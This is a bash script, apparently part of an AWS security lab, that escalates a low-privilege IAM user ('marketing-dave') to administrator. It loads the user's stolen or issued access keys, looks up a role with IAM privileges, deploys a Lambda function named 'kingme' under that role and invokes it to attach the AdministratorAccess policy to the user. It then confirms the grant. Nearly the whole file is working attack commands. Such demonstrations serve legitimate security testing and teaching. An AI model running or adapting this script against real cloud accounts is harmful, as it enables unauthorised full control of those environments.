#!/bin/bash

usage="
		Creates and runs the lambda function that gives marketing-dave Administrator Access,
		by getting and using the discovered-role-with-iam-privs role with dave's credentials.
"

if [ x$1 != x ]; then
    if [ $1 == "help" ] || [ $1 == "--help" ]; then
      echo "${usage}"
      exit 0
	fi
fi

source env.sh

#Force the script to run the creation of the function and its invoking with the marketing-dave credentials,
#to prove the privilege escalation possibility
export AWS_ACCESS_KEY_ID=`cat keys.json | jq -r '.AccessKey.AccessKeyId'`
export AWS_SECRET_ACCESS_KEY=`cat keys.json | jq -r '.AccessKey.SecretAccessKey'`

#Get the role arn, needed for the creation of the lambda function
role_arn=`aws iam get-role --role-name ${DISCOVERED_ROLE_NAME} | jq -r '.Role.Arn'`

#Create the lambda function, using the kingme.zip file, which contains the kingme.py script and the env.sh file
aws lambda create-function \
    --function-name kingme \
    --runtime python3.8 \
    --zip-file fileb://kingme.zip \
    --handler kingme.handler \
    --role $role_arn

#Call the function, which grants marketing-dave the AdministratorAccess policy
aws lambda invoke --function-name kingme kingme.out --log-type Tail --query 'LogResult' --output text |  base64 -d

#Sleep 5 seconds to let the function take effect in AWS
sleep 5

#Check that everything ran accordingly by listing the attached AdministratorAccess policy
aws iam list-attached-user-policies --user-name ${USER_NAME}

